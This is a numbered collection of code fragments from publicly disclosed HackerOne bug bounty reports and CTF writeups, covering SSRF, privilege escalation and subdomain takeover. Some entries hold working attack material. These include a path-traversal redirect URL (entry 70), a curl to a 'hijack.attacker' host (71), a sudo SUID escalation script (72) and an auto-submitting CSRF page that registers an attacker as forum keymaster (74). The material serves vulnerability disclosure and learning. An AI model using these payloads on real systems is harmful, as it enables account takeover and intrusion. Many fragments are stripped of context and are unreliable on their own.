## 70. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```json
{
    "url": "https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/\/statements?month=03&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"
}
# … truncated …
```

## 71. [#1145044](https://hackerone.com/reports/1145044)  -  Holes in EndpointSlice Validation Enable Host Network Hijack
*low*

```bash
$ curl hijack.attacker:2020/api/v1/uptime
{"uptime_sec":57070,"uptime_hr":"Fluent Bit has been running:  0 day, 15 hours, 51 minutes and 10 seconds"}
```

## 72. [#692603](https://hackerone.com/reports/692603)  -  Privilege escalation in workers container
*high, $1,500*

```
#!/bin/sh

ps -ef
sudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &
```

## 73. [#386807](https://hackerone.com/reports/386807)  -  [flintcms] Account takeover due to blind MongoDB injection in password reset
*critical*

```
${token}
```

## 74. [#2999394](https://hackerone.com/reports/2999394)  -  Pivilege escalation of any new user to Keymaster caused by CSRF
*medium*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body onload="document.getElementById('csrf-form').submit();">

    <form id="csrf-form" action="http://localhost/victim/wp-login.php" method="POST">
        <input type="hidden" name="user_login" value="evilpen">
        <input type="hidden" name="user_email" value="attacker@email.com">
        <input type="hidden" name="action" value="register">
        <input type="hidden" name="bbp-forums-role" value="bbp_keymaster">
    </form>

</body>
</html>
```

## 75. [#3020021](https://hackerone.com/reports/3020021)  -  [Vertical Privilege Escalation] User can Unapproved any Approved Translation at [/translations/unapprove/]
*medium*

```python
# Only privileged users or authors can un-approve translations
    if not (
        request.user.can_translate(locale, project)
        or request.user == translation.user
        or translation.approved
    ):
        return JsonResponse(
            {
                "status": False,
                "message": "Forbidden: You can't unapprove this translation.",
            },
            status=403,
        )

    translation.unapprove(request.user)
```

## 76. [#1842829](https://hackerone.com/reports/1842829)  -  Privilege Escalation in kOps using GCE/GCP Provider
*high, $2,500*

```
${KOPS_STATE_STORE}
```

## 77. [#689314](https://hackerone.com/reports/689314)  -  Project Template functionality can be used to copy private project data, such as repository, confidential issues, snippets, and merge requests
*critical, $12,000*

```ruby
def execute
  # ...

  group_with_project_templates_id = params.delete(:group_with_project_templates_id) if params[:template_name].blank?

  # ...

    validate_namespace_used_with_template(project, group_with_project_templates_id)
end

# ...

def validate_namespace_used_with_template(project, group_with_project_templates_id)
  return unless project.group

  subgroup_with_templates_id = group_with_project_templates_id || params[:group_with_project_templates_id]
  return if subgroup_with_templates_id.blank?

  templates_owner = ::Group.find(subgroup_with_templates_id).parent

  unless templates_owner.self_and_descendants.exists?(id: project.namespace_id)
    project.errors.add(:namespace, _("is not a descendant of the Group owning the template"))
  end
end
```

## 78. [#689314](https://hackerone.com/reports/689314)  -  Project Template functionality can be used to copy private project data, such as repository, confidential issues, snippets, and merge requests
*critical, $12,000*

```ruby
def available_custom_project_templates(subgroup_id = nil)
  group_id = subgroup_id || custom_project_templates_group_id

  return ::Project.none unless group_id

  ::Project.where(namespace_id: group_id) 
end
```

## 79. [#386807](https://hackerone.com/reports/386807)  -  [flintcms] Account takeover due to blind MongoDB injection in password reset
*critical*

```js
router.get('/verify', async (req, res) => {
    const token = req.query.t

    const user = await User.findOne({ token })

    if (!user) {
      res.redirect('/admin')
      return
    }

    res.redirect(`/admin/sp/${token}`)
  })
```

## 80. [#779113](https://hackerone.com/reports/779113)  -  [h1-415 2020] @_bayotop h1-415-ctf writeup
*critical*

```
if it's chrome headless and u can see the generated pdf, and u can access the devtools port on localhost:9222 by default.... you can access file:// :stuck_out_tongue:
if you can run javascript :smile: so much ifs
```

## 81. [#894949](https://hackerone.com/reports/894949)  -  [H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured
*critical*

```
Which led me to Part 2.

##Part 2:

From the PartTwoActivity’s source code I noticed that an intent is created and is waiting for two parameters to make its text visible. I visited the following page with those two parameters: `two=light` and `switch=on`
```

## 82. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```json
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

## 83. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```
$(".upgradeToAdmin").click(function()
```

## 84. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```
$(".sendReport").click(function() {
```

## 85. [#3632577](https://hackerone.com/reports/3632577)  -  Bedrock AgentCore Starter Toolkit Creates Gateway IAM Roles Without Confused Deputy Protections
*medium*

```json
{{ account_id }}
```

## 86. [#3632577](https://hackerone.com/reports/3632577)  -  Bedrock AgentCore Starter Toolkit Creates Gateway IAM Roles Without Confused Deputy Protections
*medium*

```json
{{ region }}
```

## 87. [#1842829](https://hackerone.com/reports/1842829)  -  Privilege Escalation in kOps using GCE/GCP Provider
*high, $2,500*

```bash
export KOPS_STATE_STORE=gs://kops-state-test/
export PROJECT=`gcloud config get-value project`

gsutil mb $KOPS_STATE_STORE
kops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2
kops update cluster --name kops.k8s.local --yes --admin
kops validate cluster --wait 10m
```

## 88. [#1197013](https://hackerone.com/reports/1197013)  -  Subdomain takeover of ████.jitsi.net
*high*

```
% dig +short ██████.jitsi.net
18.195.93.116

% curl ██████████.jitsi.net
<!-- hackerone.com/ian -->
```

## 89. [#1877919](https://hackerone.com/reports/1877919)  -  The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1
*high*

```
└─$ ../node-v19.6.1-linux-x64/bin/node --experimental-policy=policy.json proc.js
v19.6.1
#1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)
(node:2720) ExperimentalWarning: Policies are experimental.
(Use `node --trace-warnings ...` to show where the warning was created)
```

## 90. [#3025797](https://hackerone.com/reports/3025797)  -  [Privilege Escalation] User can Pin|Unpin Any Comment on Any Project or Locale
*low*

```json
{{ title: true }}
```

## 91. [#3632577](https://hackerone.com/reports/3632577)  -  Bedrock AgentCore Starter Toolkit Creates Gateway IAM Roles Without Confused Deputy Protections
*medium*

```json
"Condition": {
    "StringEquals": {
        "aws:SourceAccount": "{{ account_id }}"
    },
    "ArnLike": {
        "aws:SourceArn": "arn:aws:bedrock-agentcore:{{ region }}:{{ account_id }}:*"
    }
}
```

## 92. [#894949](https://hackerone.com/reports/894949)  -  [H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured
*critical*

```json
{F861469}
#Ciao Bella!
At this point I had access to software subdomain but it was protected by an authentication page, and since I couldn’t send credentials in GET requests, the only option I had left was to brute force files and directories to see if I could get unrestricted access to some resources.
Using the below python script, I was able to find uploads directory in which I found BountyPay.apk. Began the chapter “Attack on Android”..
```

## 93. [#520903](https://hackerone.com/reports/520903)  -  Apache HTTP [2.4.17-2.4.38] Local Root Privilege Escalation
*high, $1,500*

```http
get_aslr();
```

## 94. [#412481](https://hackerone.com/reports/412481)  -  China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability
*high*

```
DOCUMENT_NAMED:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
SERVER_SOFTWARE :Microsoft-IIS/8.5
SERVER_NAME :ecjobsdc.starbucks.com.cn
SERVER_PORT :80
REMOTE_ADDR:10.92.29.50
REMOTE_HOST:10.92.29.50
D:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
PATH_INFO:/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <httpRedirect enabled="false" destination="https://ecjobs.starbucks.net" exactDestination="false" />
    </system.webServer>
</configuration>
```

## 95. [#1718371](https://hackerone.com/reports/1718371)  -  Subdomain takeover at http://test.www.midigator.com
*high*

```code
$ dig test.www.midigator.com
[snipped]
;; ANSWER SECTION:
test.www.midigator.com.	60	IN	CNAME	test.www.midigator.com.s3-website-us-west-1.amazonaws.com.
test.www.midigator.com.s3-website-us-west-1.amazonaws.com. 59 IN CNAME s3-website-us-west-1.amazonaws.com.
s3-website-us-west-1.amazonaws.com. 4 IN A	52.219.193.3
```

## 96. [#1296584](https://hackerone.com/reports/1296584)  -  Getting a free delivery by singing up from "admin_@glovoapp.com"
*medium*

```http
Getting a free delivery for food by just signing up from "admin_@glovoapp.com" and you also see the  " FREE delivery Glovo Team
```

## 97. [#1540252](https://hackerone.com/reports/1540252)  -  subdomain takeover at odoo-staging.exness.io
*low*

```bash
$ host odoo-staging.exness.io
odoo-staging.exness.io is an alias for exness-stg.odoo.com.
exness-stg.odoo.com has address 141.95.172.222
exness-stg.odoo.com mail is handled by 10 eu123a.odoo.com.
```
